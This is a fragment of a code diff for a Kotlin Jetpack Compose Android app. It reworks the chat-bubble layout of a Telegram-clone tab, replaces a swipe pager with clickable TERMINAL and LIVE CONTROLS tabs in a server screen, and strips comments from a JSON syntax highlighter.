+                Column(horizontalAlignment = Alignment.CenterHorizontally) {
+                    Icon(Icons.Rounded.CloudOff, null, tint = TextSecondary, modifier = Modifier.size(64.dp))
+                    Spacer(modifier = Modifier.height(16.dp))
+                    Text("TDLib Engine Offline", color = TextSecondary, fontFamily = UbuntuFont)
+                    Text("Turn on using the power icon above.", color = TextSecondary, fontSize = 12.sp, fontFamily = UbuntuFont)
+                }
+            }
+        } else {
+            LazyColumn(state = listState, modifier = Modifier.weight(1f).padding(horizontal = 12.dp), verticalArrangement = Arrangement.spacedBy(4.dp)) {
+                item { Spacer(modifier = Modifier.height(16.dp)) }
+                items(viewModel.tgMessages) { msg ->
+                    val timeStr = SimpleDateFormat("h:mm a", Locale.getDefault()).format(Date(msg.timestamp))
+                    Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = if (msg.isMe) Arrangement.End else Arrangement.Start) {
+                        Card(
+                            shape = RoundedCornerShape(topStart = 16.dp, topEnd = 16.dp, bottomStart = if(msg.isMe) 16.dp else 4.dp, bottomEnd = if(msg.isMe) 4.dp else 16.dp),
+                            colors = CardDefaults.cardColors(containerColor = if(msg.isMe) TgBubbleOutgoing else TgBubbleIncoming),
+                            modifier = Modifier.widthIn(max = 300.dp)
+                        ) {
+                            Column(modifier = Modifier.padding(start = 12.dp, top = 8.dp, end = 12.dp, bottom = 6.dp)) {
+                                Text(msg.text, color = Color.White, fontSize = 15.sp, fontFamily = UbuntuFont)
+                                Row(modifier = Modifier.align(Alignment.End).padding(top = 2.dp), verticalAlignment = Alignment.CenterVertically) {
+                                    Text(timeStr, color = Color(0x99FFFFFF), fontSize = 11.sp)
+                                    if(msg.isMe) { Spacer(modifier = Modifier.width(4.dp)); Icon(Icons.Rounded.Check, null, tint = ActionBlue, modifier = Modifier.size(14.dp)) }
+                                }
                             }
                         }
                     }
                 }
+                item { Spacer(modifier = Modifier.height(8.dp)) }
             }
-            item { Spacer(modifier = Modifier.height(8.dp)) }
         }
 
-        // Input Bar
         Row(modifier = Modifier.fillMaxWidth().background(TgInputBg).padding(8.dp), verticalAlignment = Alignment.CenterVertically) {
             Icon(Icons.Rounded.EmojiEmotions, null, tint = TextSecondary, modifier = Modifier.padding(horizontal = 8.dp))
             BasicTextField(
@@ -646,24 +700,20 @@ fun TelegramCloneTab(viewModel: CoreViewModel) {
 @Composable
 fun ServerTab(viewModel: CoreViewModel) {
     val context = LocalContext.current
-    val pagerState = rememberPagerState(pageCount = { 2 })
-    
-    // Check if server is running via StateFlow so UI updates instantly if killed from notification
     val isRunning by ServerCore.isRunningFlow.collectAsState()
+    var selectedPage by remember { mutableStateOf(0) }
 
     Column(modifier = Modifier.fillMaxSize()) {
         TabRow(
-            selectedTabIndex = pagerState.currentPage,
-            containerColor = Color.Transparent,
-            contentColor = PremiumTeal,
-            indicator = { tabPositions -> TabRowDefaults.Indicator(Modifier.tabIndicatorOffset(tabPositions[pagerState.currentPage]), color = PremiumTeal) }
+            selectedTabIndex = selectedPage, containerColor = Color.Transparent, contentColor = PremiumTeal,
+            indicator = { tabPositions -> TabRowDefaults.Indicator(Modifier.tabIndicatorOffset(tabPositions[selectedPage]), color = PremiumTeal) }
         ) {
-            Tab(selected = pagerState.currentPage == 0, onClick = { /* Swipe controlled */ }, text = { Text("TERMINAL", fontFamily = UbuntuFont, color = if(pagerState.currentPage == 0) PremiumTeal else TextSecondary) })
-            Tab(selected = pagerState.currentPage == 1, onClick = { /* Swipe controlled */ }, text = { Text("LIVE CONTROLS", fontFamily = UbuntuFont, color = if(pagerState.currentPage == 1) PremiumTeal else TextSecondary) })
+            Tab(selected = selectedPage == 0, onClick = { selectedPage = 0 }, text = { Text("TERMINAL", fontFamily = UbuntuFont, color = if(selectedPage == 0) PremiumTeal else TextSecondary) })
+            Tab(selected = selectedPage == 1, onClick = { selectedPage = 1 }, text = { Text("LIVE CONTROLS", fontFamily = UbuntuFont, color = if(selectedPage == 1) PremiumTeal else TextSecondary) })
         }
-
-        HorizontalPager(state = pagerState, modifier = Modifier.weight(1f)) { page ->
-            if (page == 0) TerminalPage(viewModel, context, isRunning) else LiveControlPage(viewModel, context)
+        Box(modifier = Modifier.weight(1f)) {
+            if (selectedPage == 0) TerminalPage(viewModel, context, isRunning) 
+            else LiveControlPage(viewModel, context)
         }
     }
 }
@@ -695,7 +745,6 @@ fun LiveControlPage(viewModel: CoreViewModel, context: Context) {
 
     if (showAudioModal) AudioControlModal(viewModel, context) { showAudioModal = false }
     if (showScreenCast) ScreenCastOverlay(viewModel) { showScreenCast = false }
-
     if (promptVibrate) {
         AlertDialog(
             onDismissRequest = { promptVibrate = false }, containerColor = Color(0xFF1E293B),
@@ -768,7 +817,6 @@ fun ScreenCastOverlay(viewModel: CoreViewModel, onDismiss: () -> Unit) {
     }
 }
 
-// --- JSON Syntax Highlighter ---
 class JsonVisualTransformation : VisualTransformation {
     override fun filter(text: AnnotatedString): TransformedText {
         val coloredString = buildAnnotatedString {
@@ -778,11 +826,11 @@ class JsonVisualTransformation : VisualTransformation {
             for (match in regex.findAll(str)) {
                 append(str.substring(lastIndex, match.range.first))
                 val color = when {
-                    match.groups[1] != null -> ActionBlue // Keys
-                    match.groups[2] != null -> SuccessGreen // Strings
-                    match.groups[3] != null -> PremiumPurple // Numbers
-                    match.groups[4] != null -> PremiumRose // Booleans
-                    match.groups[5] != null -> TextPrimary // Brackets
+                    match.groups[1] != null -> ActionBlue 
+                    match.groups[2] != null -> SuccessGreen 
+                    match.groups[3] != null -> PremiumPurple 
+                    match.groups[4] != null -> PremiumRose 
+                    match.groups[5] != null -> TextPrimary 
                     else -> TextPrimary
                 }
                 withStyle(SpanStyle(color = color)) { append(match.value) }
